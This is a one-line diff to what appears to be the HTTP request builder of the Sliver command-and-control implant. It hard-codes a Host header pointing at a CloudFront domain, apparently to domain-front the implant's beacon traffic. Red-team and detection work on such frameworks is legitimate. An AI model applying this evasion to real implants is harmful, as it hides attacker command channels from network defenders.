@@ -123,6 +123,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *h
 	req, _ := http.NewRequest(method, uri, body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
+	req.Header.Set("Host","d2umm24rbp53ai.cloudfront.net")
 	return req
 }
 
